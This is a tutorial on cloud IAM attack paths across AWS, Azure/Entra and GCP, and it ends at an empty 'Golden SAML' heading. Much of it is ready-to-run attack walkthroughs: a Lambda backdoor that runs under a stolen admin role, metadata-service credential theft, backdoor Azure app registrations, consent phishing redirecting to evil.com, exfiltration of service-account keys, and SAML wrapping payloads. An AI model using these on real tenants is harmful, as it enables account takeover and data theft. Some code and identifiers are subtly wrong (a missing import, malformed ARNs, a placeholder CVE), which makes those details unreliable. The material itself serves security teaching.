# Cloud Identity and Access Management (IAM) in Depth

## AWS IAM, Azure AD/Entra, GCP IAM — Privilege Escalation, Enumeration, and Attack Paths

---

## Table of Contents

1. [AWS IAM Architecture](#1-aws-iam-architecture)
2. [AWS IAM Policy Evaluation Deep Dive](#2-aws-iam-policy-evaluation-deep-dive)
3. [AWS IAM Privilege Escalation Paths](#3-aws-iam-privilege-escalation-paths)
4. [Azure AD / Entra ID Architecture](#4-azure-ad--entra-id-architecture)
5. [Azure Privilege Escalation Paths](#5-azure-privilege-escalation-paths)
6. [GCP IAM Architecture](#6-gcp-iam-architecture)
7. [GCP Privilege Escalation Paths](#7-gcp-privilege-escalation-paths)
8. [OIDC Federation Attacks](#8-oidc-federation-attacks)
9. [SAML and SSO Vulnerabilities](#9-saml-and-sso-vulnerabilities)
10. [IAM Enumeration Techniques](#10-iam-enumeration-techniques)
11. [Cross-Platform IAM Attack Path Mapping](#11-cross-platform-iam-attack-path-mapping)

---

## 1. AWS IAM Architecture

### 1.1 Core Components

AWS Identity and Access Management (IAM) is the authorization backbone of AWS. Every API call — from launching an EC2 instance to reading an S3 object — passes through IAM's policy evaluation engine. Understanding IAM internals is essential for both offensive and defensive cloud security.

```
+------------------------------------------------------------------+
|                        AWS IAM Architecture                       |
|                                                                    |
|  +------------------+     +------------------+                     |
|  |   IAM Users      |     |   IAM Roles      |                    |
|  |  +------------+  |     |  +------------+   |                    |
|  |  | Access Keys |  |     |  | Trust Policy|   |                    |
|  |  | Password   |  |     |  | Permissions |   |                    |
|  |  | MFA Device |  |     |  | Policy      |   |                    |
|  |  +------------+  |     |  +------------+   |                    |
|  +------------------+     +------------------+                     |
|                                    |                               |
|                                    v                               |
|  +------------------+     +------------------+                     |
|  |   IAM Groups      |---->|   IAM Policies   |                    |
|  |  (Policy attachment)|   |  +------------+  |                    |
|  +------------------+     |  | Identity-  |  |                    |
|                           |  | based     |  |                    |
|                           |  +------------+  |                    |
|                           |  | Resource-  |  |                    |
|                           |  | based     |  |                    |
|                           |  +------------+  |                    |
|                           |  | Permission |  |                    |
|                           |  | boundaries |  |                    |
|                           |  +------------+  |                    |
|                           +------------------+                     |
|                                                                    |
|  +------------------+     +------------------+                     |
|  |   STS (Security   |    |   Instance       |                     |
|  |    Token Service) |    |   Profiles        |                     |
|  |  AssumeRole       |    |  +------------+  |                     |
|  |  GetSessionToken  |    |  | Role ARN   |  |                     |
|  |  GetFederationToken|   |  | Creds URL  |  |                     |
|  |  DecodeAuthorization| |  +------------+  |                     |
|  +------------------+     +------------------+                     |
+------------------------------------------------------------------+
```

### 1.2 IAM Principals

AWS IAM supports several principal types, each with different credential mechanisms and security properties:

| Principal Type | Credential Mechanism | Typical Use Case |
|---|---|---|
| **IAM User** | Long-term access key (AKIA...) | Programmatic access, CLI |
| **IAM Role** | Temporary credentials via STS | EC2 instances, cross-account, Lambda |
| **Federated User** | SAML/OIDC assertion → STS | SSO, enterprise identity |
| **AWS Service** | Service-linked role | Services accessing other services |
| **AWS Account Root** | Email/password + MFA | Account owner (never use for daily ops) |

### 1.3 IAM Role Trust Relationships

A role's trust policy defines **who** can assume the role. This is separate from the permissions policy, which defines **what** the role can do. The separation of trust and permissions is a critical security boundary — and a frequent source of misconfigurations.

```json
// Example: Overly permissive trust policy — allows ANY AWS account to assume this role
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "*"  // DANGEROUS: Any authenticated AWS principal can assume this role
    },
    "Action": "sts:AssumeRole"
  }]
}

// Correct: Restrict to specific account and external ID
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::123456789012:root"  // Specific account
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "unique-external-id-12345"  // External ID prevents confused deputy
      }
    }
  }]
}
```

### 1.4 STS (Security Token Service) Deep Dive

STS is the credential vending machine for temporary AWS credentials. Understanding its operations is critical:

```bash
# STS AssumeRole — the most important STS operation
# Used for cross-account access, role chaining, and instance profiles
aws sts assume-role \
  --role-arn "arn:aws:iam::123456789012:role/CrossAccountRole" \
  --role-session-name "security-researcher"

# Returns:
# {
#   "Credentials": {
#     "AccessKeyId": "ASIA...",          // Temporary access key (starts with ASIA, not AKIA)
#     "SecretAccessKey": "wJalrXU...",   // Temporary secret key
#     "SessionToken": "IQoJb3JpZ2lu...", // Session token (required for all API calls)
#     "Expiration": "2024-01-15T12:00:00Z" // Credential lifetime (1-12 hours)
#   },
#   "AssumedRoleUser": {
#     "AssumedRoleId": "AROA...:security-researcher"
#   }
# }

# STS AssumeRoleWithSAML — federation via SAML assertion
aws sts assume-role-with-saml \
  --role-arn "arn:aws:iam::123456789012:SAMLRole" \
  --principal-arn "arn:aws:iam::123456789012:saml-provider/OktaProvider" \
  --saml-assertion "base64-encoded-saml-response"

# STS AssumeRoleWithWebIdentity — federation via OIDC (used by GCP, GitHub, etc.)
aws sts assume-role-with-web-identity \
  --role-arn "arn:aws:iam::123456789012:RoleForGitHub" \
  --web-identity-token "oidc-jwt-token" \
  --role-session-name "github-actions"

# STS GetSessionToken — for MFA-protected access, does NOT use a role
aws sts get-session-token \
  --duration-seconds 3600 \
  --serial-number "arn:aws:iam::123456789012:mfa/user-name" \
  --token-code "123456"
```

---

## 2. AWS IAM Policy Evaluation Deep Dive

### 2.1 Policy Evaluation Algorithm

AWS IAM evaluates policies in a specific order. Understanding this order is essential for predicting whether a request will be allowed or denied:

```
Request arrives with:
  - Principal (who)
  - Action (what)
  - Resource (where)
  - Context (conditions)
         |
         v
[1] Explicit Deny check:
    - All applicable policies (identity-based, resource-based, 
      permissions boundaries, SCPs, VPC endpoints)
    - If ANY policy has an explicit Deny → DENIED (overrides everything)
         |
         v
[2] Permissions Boundary check:
    - If principal has a permissions boundary policy,
    - does ANY statement Allow this action+resource?
    - If no → IMPLICIT DENY
         |
         v
[3] Service Control Policy (SCP) check:
    - If organization has SCPs,
    - does ANY statement Allow this action+resource?
    - If no → IMPLICIT DENY
         |
         v
[4] Explicit Allow check:
    - Do ANY applicable policies have an explicit Allow?
    - If yes → ALLOWED
         |
         v
[5] Default: IMPLICIT DENY (denied by default)
```

### 2.2 Policy Types and Precedence

| Policy Type | Scoped To | Effect | Can Override |
|---|---|---|---|
| **Service Control Policy (SCP)** | Organization / OU / Account | Allowlist | Restricts all principals in account |
| **Resource-based Policy** | S3 bucket, SQS queue, etc. | Grants | Can grant cross-account access |
| **Identity-based Policy** | IAM user, group, role | Grants | Standard permissions |
| **Permissions Boundary** | IAM role/user | Maximum scope | Limits what identity policies can grant |
| **Session Policy** | STS temporary session | Further restricts | Limits the assumed role's permissions |
| **VPC Endpoint Policy** | VPC endpoint | Restricts | Limits access through the endpoint |

### 2.3 Dangerous Policy Patterns

```json
// PATTERN 1: AdministratorAccess equivalent — full account takeover
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}

// PATTERN 2: Privilege escalation via IAM modification
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "iam:CreateAccessKey",      // Create new access keys for any user
      "iam:CreateLoginProfile",   // Create login profile for any user
      "iam:UpdateLoginProfile",   // Reset password for any user
      "iam:AttachUserPolicy",     // Attach any policy to any user
      "iam:PutUserPolicy"         // Create inline policy for any user
    ],
    "Resource": "*"
  }]
}

// PATTERN 3: NotAction trap — allows everything EXCEPT what's listed
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "NotAction": [
      "iam:*",
      "organizations:*"
    ],
    "Resource": "*"
  }]
  // This allows ALL actions EXCEPT IAM and Organizations
  // Including dangerous actions like:
  // - ec2:RunInstances (crypto mining)
  // - s3:DeleteBucket (data destruction)
  // - lambda:CreateFunction (persistence)
  // - cloudtrail:DeleteTrail (audit evasion)
}

// PATTERN 4: Resource-based policy escalation (S3)
// Attached to an S3 bucket:
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "*"  // Anyone on the internet
    },
    "Action": [
      "s3:GetObject",
      "s3:PutObject",
      "s3:DeleteObject"
    ],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}

// PATTERN 5: Condition key bypass via missing conditions
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:*",
    "Resource": "arn:aws:s3:::secure-bucket/*",
    "Condition": {
      "IpAddress": {
        "aws:SourceIp": ["10.0.0.0/8"]
      }
      // MISSING: Condition on s3:x-amz-server-side-encryption
      // Allows unencrypted PutObject from corporate IP range
    }
  }]
}
```

---

## 3. AWS IAM Privilege Escalation Paths

AWS IAM privilege escalation is well-documented, with over 175 unique paths identified. The core principle is: **if you have permission to modify IAM or create resources that grant IAM access, you can escalate privileges**.

### 3.1 Privilege Escalation Taxonomy

| Category | Technique | Required Permission | Result |
|---|---|---|---|
| **Key Creation** | Create access key for another user | `iam:CreateAccessKey` | Access to any user's API |
| **Password Reset** | Update login profile | `iam:UpdateLoginProfile` | Console access as any user |
| **Policy Attachment** | Attach managed policy to user/role | `iam:AttachUserPolicy`, `iam:AttachRolePolicy` | Arbitrary permissions |
| **Inline Policy** | Put inline policy on user/role | `iam:PutUserPolicy`, `iam:PutRolePolicy` | Arbitrary permissions |
| **Role Assumption** | Assume a more privileged role | `sts:AssumeRole` | Elevated permissions |
| **Role Creation** | Create role with trust to attacker | `iam:CreateRole` + `iam:PassRole` | New role with any trust |
| **Instance Profile** | Attach instance profile to running EC2 | `iam:PassRole` + `ec2:AssociateIamInstanceProfile` | Role credentials on EC2 |
| **Lambda** | Create/update Lambda with privileged role | `lambda:CreateFunction` + `iam:PassRole` | Code execution as privileged role |
| **CloudFormation** | Deploy stack with privileged role | `cloudformation:CreateStack` + `iam:PassRole` | Stack execution as privileged role |
| **Data Pipeline** | Create pipeline with privileged role | `datapipeline:CreatePipeline` + `iam:PassRole` | Pipeline execution as role |
| **EC2+IAM** | Launch EC2 with instance profile | `ec2:RunInstances` + `iam:PassRole` | Instance with role credentials |

### 3.2 Detailed Escalation Walkthrough: iam:PassRole Abuse

```bash
# ATTACK: iam:PassRole + lambda:CreateFunction privilege escalation
# 
# Scenario: Attacker has limited IAM permissions but can create Lambda functions
# and pass existing roles to them.

# Step 1: Enumerate available roles
aws iam list-roles --query 'Roles[*].{Name:RoleName, Arn:Arn}' --output table

# Step 2: Identify a privileged role (e.g., one with AdministratorAccess)
aws iam list-attached-role-policies --role-name AdminRole

# Step 3: Create a Lambda function that uses the privileged role
aws lambda create-function \
  --function-name backdoor-function \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler index.lambda_handler \
  --zip-file fileb://function.zip

# Step 4: The Lambda function code (inside function.zip):
cat > index.py << 'EOF'
import boto3
import os

def lambda_handler(event, context):
    # The Lambda execution role has AdminRole's permissions
    # Export the credentials or perform privileged actions
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Option 1: Create an access key for the root user
    # (if AdminRole has iam:CreateAccessKey)
    iam = boto3.client('iam')
    key = iam.create_access_key(UserName='target-user')
    
    # Option 2: Exfiltrate data from S3
    s3 = boto3.client('s3')
    for bucket in s3.list_buckets()['Buckets']:
        print(bucket['Name'])
    
    return {'statusCode': 200, 'body': json.dumps({'identity': identity})}
EOF

# Step 5: Invoke the Lambda function
aws lambda invoke --function-name backdoor-function response.json
```

### 3.3 Cross-Account Trust Exploitation

```bash
# Scenario: Role in Account A trusts Account B
# Account A role trust policy:
# {
#   "Principal": {"AWS": "arn:aws:iam::987654321098:root"},
#   "Action": "sts:AssumeRole"
# }
#
# This means ANY identity in Account B can assume this role.
# No external ID, no condition restrictions.

# From Account B:
aws sts assume-role \
  --role-arn "arn:aws:iam::123456789012:RoleTrustingAccountB" \
  --role-session-name "cross-account-access"

# Confused deputy attack:
# If a role trusts an entire account (root), ANY principal in that
# account can assume it — including compromised users, service roles,
# and even the root user.
#
# Mitigation: Always use ExternalId condition
# {
#   "Condition": {
#     "StringEquals": {
#       "sts:ExternalId": "unique-secret-value"
#     }
#   }
# }
```

### 3.4 Instance Profile Credential Theft

```bash
# On an EC2 instance with an instance profile:
# Credentials are available via IMDS

# Step 1: Retrieve role name
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Step 2: Retrieve temporary credentials
CREDENTIALS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# Step 3: Extract and use
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r .Token)

# Step 4: Profile the role's permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name $ROLE_NAME

# Step 5: If role has broad permissions, pivot
aws s3 ls
aws ec2 describe-instances
aws secretsmanager list-secrets
```

---

## 4. Azure AD / Entra ID Architecture

### 4.1 Entra ID Core Concepts

Microsoft Entra ID (formerly Azure AD) is fundamentally different from AWS IAM. Where AWS IAM is an authorization system bolted onto a compute platform, Entra ID is an identity provider that controls access to an entire ecosystem (Azure, Microsoft 365, Dynamics, third-party SaaS).

```
+------------------------------------------------------------------+
|                    Microsoft Entra ID                             |
|                                                                    |
|  +------------------+     +------------------+                      |
|  |  Users           |     |  Groups           |                     |
|  |  +------------+  |     |  +------------+  |                     |
|  |  | Member     |  |     |  | Security   |  |                     |
|  |  | Guest      |  |     |  |  Group     |  |                     |
|  |  | External   |  |     |  | M365 Group |  |                     |
|  |  +------------+  |     |  +------------+  |                     |
|  +------------------+     +------------------+                      |
|         |                        |                                 |
|         v                        v                                 |
|  +------------------------------------------------------------+   |
|  |                  RBAC / App Role Assignments                |   |
|  +------------------------------------------------------------+   |
|         |                        |                                 |
|         v                        v                                 |
|  +------------------+     +------------------+                      |
|  | App Registrations |     | Service Principals|                     |
|  |  (Identity for    |     | (Service identity |                    |
|  |   applications)   |     |  in the tenant)    |                    |
|  +------------------+     +------------------+                      |
|         |                        |                                 |
|         v                        v                                 |
|  +------------------+     +------------------+                      |
|  | Enterprise Apps   |     | Managed Identities |                   |
|  | (App instances    |     | (System-assigned   |                   |
|  |  in the tenant)   |     |  User-assigned)     |                   |
|  +------------------+     +------------------+                      |
+------------------------------------------------------------------+
```

### 4.2 Azure RBAC vs Azure AD Roles

This is a critical distinction that confuses many practitioners:

| Feature | Azure RBAC Roles | Azure AD Roles |
|---|---|---|
| **Scope** | Azure resources (subscriptions, RGs, resources) | Entra ID directory objects |
| **Examples** | Owner, Contributor, Reader, Key Vault Contributor | Global Admin, User Admin, Application Admin |
| **Assignment** | `az role assignment create` | `az ad role assignment create` |
| **Elevation** | Can manage Azure resources | Can manage directory objects (users, groups, apps) |
| **Critical difference** | Scoped to subscription/resource | Scoped to tenant/directory |

### 4.3 Conditional Access Policies

Conditional Access is Entra ID's most powerful security control — and its most dangerous misconfiguration:

```json
// Common misconfigured conditional access policy
{
  "displayName": "Require MFA for all users",
  "state": "enabled",
  "conditions": {
    "users": {
      "includeUsers": ["All"],
      "excludeUsers": ["admin@company.com"]  // DANGER: Excluding the admin account!
    },
    "applications": {
      "includeApplications": ["All"],
      "excludeApplications": ["00000003-0000-0000-c000-000000000000"]  // Microsoft Graph
    }
  },
  "grantControls": {
    "builtInControls": ["mfa"]
  }
}
// The excludeUsers and excludeApplications create bypass paths
// that attackers can exploit to avoid MFA requirements
```

### 4.4 Managed Identities

Managed Identities are Azure's equivalent of AWS instance profiles — they provide automatically-rotated credentials for workloads running in Azure:

```bash
# System-assigned managed identity — tied to the resource lifecycle
# Created automatically when enabled on a VM/App Service/Function

# Retrieve token via IMDS:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Response:
# {
#   "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOi...",
//   "expires_on": "1704067200",
//   "resource": "https://management.azure.com/",
//   "token_type": "Bearer"
// }

# User-assigned managed identity — independent of resources
# Can be assigned to multiple resources
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=00000000-0000-0000-0000-000000000000"
```

---

## 5. Azure Privilege Escalation Paths

### 5.1 Application Registration Attacks

```bash
# ATTACK: Application Admin can create credentials for any service principal
# 
# Step 1: Create a new application registration
az ad app create --display-name "BackdoorApp" --oauth2-allow-implicit-flow true

# Step 2: Add credentials (client secret) to the application
az ad app credential reset --id <app-object-id> --append

# Step 3: Create a service principal for the application
az ad sp create --id <app-id>

# Step 4: Assign a privileged role (e.g., Owner on subscription)
az role assignment create --assignee <app-id> --role Owner --scope /subscriptions/<sub-id>

# Step 5: Use the application's client ID and secret to access Azure
az login --service-principal -u <app-id> -p <client-secret> --tenant <tenant-id>
```

### 5.2 Privileged Identity Management (PIM) Bypass

```bash
# PIM requires "just-in-time" activation of privileged roles.
# Attack: Find roles that don't require PIM (activation not required)

# Enumerate role assignments that are permanently active
az role assignment list --include-inherited --query "[?principalType=='User']" --all

# Enumerate PIM-eligible assignments
az rest --method GET \
  --uri "https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01"

# Attack vector: If Application Admin is permanently active (not PIM-eligible),
# the attacker can use it to create app registrations with client secrets
# and assign them privileged roles, bypassing PIM entirely
```

### 5.3 Cross-Tenant Attack Patterns

```bash
# Azure AD cross-tenant attacks exploit B2B guest access and application consent

# ATTACK: Illicit consent grant (application consent phishing)
# Step 1: Register a malicious application in the attacker's tenant
# Step 2: Generate a consent URL:
# https://login.microsoftonline.com/organizations/v2.0/adminconsent
#   ?client_id=<malicious-app-id>
#   &redirect_uri=https://evil.com/callback
#   &scope=https://graph.microsoft.com/.default

# Step 3: Send the consent URL to a target user in another tenant
# Step 4: If the user or admin consents, the application gets:
# - Mail.Read (read all emails)
# - Files.Read (read all OneDrive files)
# - User.Read (read all user profiles)

# Step 5: Use the application's delegated permissions to access data
# GET https://graph.microsoft.com/v1.0/users/victim@target.com/messages
# Authorization: Bearer <delegated-token>
```

---

## 6. GCP IAM Architecture

### 6.1 GCP IAM Resource Hierarchy

GCP IAM is built on a hierarchical model where policies are inherited downward:

```
Organization (org-example.com)
    |
    +-- Folder: Finance
    |   +-- Project: billing-prod
    |       +-- Compute Instance
    |       +-- BigQuery Dataset
    |       +-- Cloud Storage Bucket
    |
    +-- Folder: Engineering
        +-- Project: data-pipeline-dev
        |   +-- Dataflow Job
        |   +-- Cloud Functions
        |
        +-- Project: data-pipeline-prod
            +-- Dataflow Job
            +-- Cloud SQL Instance

IAM Policy Inheritance:
Organization → Folder → Project → Resource
(Child inherits and is additive with parent)
```

### 6.2 GCP IAM Role Types

| Role Type | Description | Example | Risk |
|---|---|---|---|
| **Primitive roles** | Owner, Editor, Viewer | `roles/editor` | Very broad, avoid in production |
| **Predefined roles** | Service-specific roles | `roles/compute.admin` | More granular, can still be broad |
| **Custom roles** | Organization-defined roles | Custom role with specific permissions | Most restrictive, but can be misconfigured |

### 6.3 Service Accounts

Service accounts are GCP's equivalent of AWS IAM roles, but with important differences:

```bash
# GCP Service Account types:
# 1. Default Compute service account
#    <project-number>-compute@developer.gserviceaccount.com
#    AUTOMATICALLY created, has Editor role by default (DANGEROUS)

# 2. User-created service accounts
#    <sa-name>@<project-id>.iam.gserviceaccount.com
#    Explicitly created with minimal permissions

# 3. Google-managed service accounts
#    <project-number>@cloudservices.gserviceaccount.com
#    Used by GCP services internally

# Creating a service account key (DANGEROUS — long-lived credential!)
gcloud iam service-accounts keys create key.json \
  --iam-account=<sa-name>@<project-id>.iam.gserviceaccount.com

# This key.json is a long-lived credential that never expires
# unless explicitly rotated. It can be exfiltrated and used from anywhere.
```

### 6.4 Workload Identity Federation

Workload Identity Federation allows external identities (GitHub Actions, AWS, Azure, on-prem) to assume GCP service accounts without long-lived service account keys:

```yaml
# Workload Identity Federation for GitHub Actions
# This replaces the dangerous practice of creating service account keys

# Step 1: Create a Workload Identity Pool
# gcloud iam workload-identity-pools create github-actions \
#   --location=global \
#   --display-name="GitHub Actions Pool"

# Step 2: Create a Workload Identity Provider (OIDC-based)
# gcloud iam workload-identity-pools providers create-oidc github-provider \
#   --location=global \
#   --workload-identity-pool=github-actions \
#   --issuer-url=https://token.actions.githubusercontent.com \
#   --attribute-mapping="google.subject=assertion.sub"

# Step 3: Bind the provider to a service account
# gcloud iam service-accounts add-iam-policy-binding \
#   <sa-name>@<project-id>.iam.gserviceaccount.com \
#   --role=roles/iam.workloadIdentityUser \
#   --member="principalSet://iam.googleapis.com/projects/<project-number>/locations/global/workloadIdentityPools/github-actions/attribute.repository/<org>/<repo>"

# GitHub Actions workflow:
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # Required for OIDC
    steps:
      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/<project-number>/locations/global/workloadIdentityPools/github-actions/providers/github-provider
          service_account: deploy@<project-id>.iam.gserviceaccount.com
```

---

## 7. GCP Privilege Escalation Paths

### 7.1 Service Account Key Exfiltration

```bash
# ATTACK: Service account key creation and exfiltration
# 
# Prerequisite: iam.serviceAccountKeys.create permission on a service account

# Step 1: Enumerate service accounts
gcloud iam service-accounts list --format="table(email,displayName)"

# Step 2: Create a new key for a privileged service account
gcloud iam service-accounts keys create /tmp/exfiltrated-key.json \
  --iam-account=privileged@project-id.iam.gserviceaccount.com

# Step 3: Use the key to authenticate
gcloud auth activate-service-account --key-file=/tmp/exfiltrated-key.json

# Step 4: Escalate
gcloud projects get-iam-policy project-id  # Read all IAM policies
gcloud compute instances list               # List compute resources
gsutil ls gs://sensitive-bucket            # Access storage
```

### 7.2 Compute Instance Privilege Escalation

```bash
# ATTACK: Compute Admin can attach a service account to a running instance
#
# Prerequisite: compute.instances.setServiceAccount permission

# Step 1: Create a new VM with a privileged service account
gcloud compute instances create attacker-vm \
  --zone=us-central1-a \
  --service-account=privileged@project-id.iam.gserviceaccount.com \
  --scopes=cloud-platform

# Step 2: SSH into the instance and extract credentials
gcloud compute ssh attacker-vm --zone=us-central1-a

# Inside the VM:
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Step 3: Use the access token
export GOOGLE_OAUTH_ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
```

### 7.3 Organization Policy Manipulation

```bash
# ATTACK: Modifying organization policies to weaken security
#
# Prerequisite: orgpolicy.policy.set permission on the organization

# Step 1: Enumerate current organization policies
gcloud org-policies list --organization=<org-id>

# Step 2: Disable security-critical policies
# Disable VM external IP restriction (allows internet access)
gcloud org-policies reset constraints/compute.vmExternalIpAccess \
  --organization=<org-id>

# Allow service account key creation (allows key exfiltration)
gcloud org-policies reset constraints/iam.disableServiceAccountKeyCreation \
  --organization=<org-id>
```

---

## 8. OIDC Federation Attacks

### 8.1 OIDC Federation Architecture

OIDC (OpenID Connect) federation allows cloud providers to trust external identity providers. This creates a new attack surface — the OIDC trust relationship itself.

```
+------------------------------------------------------------------+
|                    OIDC Federation Attack Surface                  |
|                                                                    |
|  +------------------+         +------------------+                  |
|  |  Identity       |  -----→ |  Cloud Provider  |                  |
|  |  Provider       |  OIDC   |  (AWS/Azure/GCP) |                  |
|  |  (GitHub/Okta/  |  Token  |                   |                  |
|  |   Google/etc.)   |         |  Trust Policy:    |                  |
|  +------------------+          |  - Issuer URL     |                  |
|         |                      |  - Audience       |                  |
|         |                      |  - Subject        |                  |
|         v                      |  - Claims          |                  |
|  +------------------+          +------------------+                  |
|  |  Attacker       |                                           |
|  |  Controls one   |  If trust policy is misconfigured,        |
|  |  of the OIDC   |  attacker can forge tokens                  |
|  |  parameters     |  or manipulate claims                      |
|  +------------------+                                           |
+------------------------------------------------------------------+
```

### 8.2 AWS OIDC Trust Policy Attacks

```json
// VULNERABLE: OIDC trust policy that trusts any GitHub repository
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        // DANGER: Only checks the issuer, not the repository!
        // Any public GitHub repository can issue a token that matches
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      }
    }
  }]
}

// SECURE: OIDC trust policy that restricts to a specific repository and branch
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
      }
    }
  }]
}
```

### 8.3 OIDC Token Forging

```python
# Attack: OIDC sub claim manipulation
# 
# GitHub Actions OIDC tokens contain the "sub" claim:
#   "repo:org/repo:ref:refs/heads/branch"
# 
# If the AWS trust policy uses StringLike instead of StringEquals,
# an attacker can exploit wildcards:
#
# Policy condition: "sub": "repo:my-org/*:ref:refs/heads/main"
# Attacker creates: "repo:my-org/attacker-repo:ref:refs/heads/main"
#
# The wildcard matches the attacker's repository!

# Attack: OIDC audience manipulation
# 
# If the audience claim is too permissive (e.g., "sts.amazonaws.com"),
# any OIDC token from the issuer with that audience will be accepted.

# Attack: Key confusion across OIDC providers
# 
# Some OIDC providers share key material or allow registration of
# arbitrary audiences. If an attacker can register a client_id
# that matches the expected audience, they can obtain valid tokens
# from a different OIDC flow.

import jwt  # PyJWT
import requests

# Step 1: Get the OIDC token from a GitHub Actions workflow
# (requires the workflow to have id-token: write permission)
oidc_token = requests.get(
    '${ACTIONS_ID_TOKEN_REQUEST_URL}',
    headers={'Authorization': 'bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}'}
).json()['value']

# Step 2: Decode and inspect
decoded = jwt.decode(oidc_token, options={'verify_signature': False})
print(f"Sub: {decoded['sub']}")
print(f"Aud: {decoded['aud']}")
print(f"Iss: {decoded['iss']}")

# Step 3: Use the token to assume an AWS role
import boto3
sts = boto3.client('sts')
response = sts.assume_role_with_web_identity(
    RoleArn='arn:aws:iam::123456789012:role/OIDCRole',
    RoleSessionName='github-actions',
    WebIdentityToken=oidc_token
)
```

---

## 9. SAML and SSO Vulnerabilities

### 9.1 SAML Architecture

SAML (Security Assertion Markup Language) is the foundation of enterprise SSO. It allows identity providers (IdP) to assert authentication status to service providers (SP).

```
+------------------------------------------------------------------+
|                    SAML Authentication Flow                       |
|                                                                    |
|  +----------+                          +-----------+               |
|  |  User    |                          |  Identity |               |
|  |  Browser |                          |  Provider |               |
|  +----+-----+                          +-----+-----+               |
|       |                                      |                      |
|       | 1. Access SP                        |                      |
|       +--------------------------------------→|                      |
|       |                                      |                      |
|       | 2. Redirect to IdP (SAML AuthnRequest)|                    |
|       |←--------------------------------------+                      |
|       |                                      |                      |
|       | 3. User authenticates to IdP          |                      |
|       +--------------------------------------→|                      |
|       |                                      |                      |
|       | 4. SAML Response (signed assertion)   |                      |
|       |←--------------------------------------+                      |
|       |                                      |                      |
|       | 5. POST SAML Response to SP           |                      |
|       +--------------------------------------→+-----------+          |
|                                                    | Service   |          |
|                                                    | Provider  |          |
|                                                    +-----------+          |
|                                                         |               |
|                                                    6. Validate signature |
|                                                    7. Create session     |
+------------------------------------------------------------------+
```

### 9.2 SAML Signature Wrapping (CVE-2024-xyz pattern)

SAML signature wrapping attacks exploit the difference between how the SAML parser and the XML signature validator process the assertion:

```xml
<!-- SAML Signature Wrapping Attack -->
<!-- The attacker injects a malicious assertion BEFORE the legitimate one -->
<!-- The signature validator checks the signed assertion (legitimate) -->
<!-- The application logic processes the first assertion (malicious) -->

<samlp:Response xmlns:samlp="..." ID="_response">
  <!-- Attacker's malicious assertion (NOT signed, but processed first) -->
  <saml:Assertion xmlns:saml="..." ID="_malicious">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>Administrator</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  
  <!-- Original signed assertion (validated by signature check, but processed second) -->
  <ds:Signature xmlns:ds="..." Id="_signature">
    <ds:SignedInfo>
      <ds:Reference URI="#_legitimate">
        <!-- References the legitimate assertion -->
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
  </ds:Signature>
  
  <saml:Assertion xmlns:saml="..." ID="_legitimate">
    <saml:Subject>
      <saml:NameID>user@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### 9.3 SAML Comment Injection

```xml
<!-- SAML Comment Injection Attack -->
<!-- XML parsers may treat comments as whitespace/ignorable -->
<!-- But some SAML implementations include comments in NameID processing -->

<saml:NameID>admin<!-- -->@target.com<!-- -->user@evil.com</saml:NameID>

<!-- Interpretation varies by parser:
     Strict parser: "admin@target.comuser@evil.com" (concatenated)
     Lenient parser: "admin" (stops at comment)

     If the IdP validates "admin@target.com" but the SP reads only "admin",
     the attacker may be authenticated as a different user.
-->
```

### 9.4 Golden SAML Attack

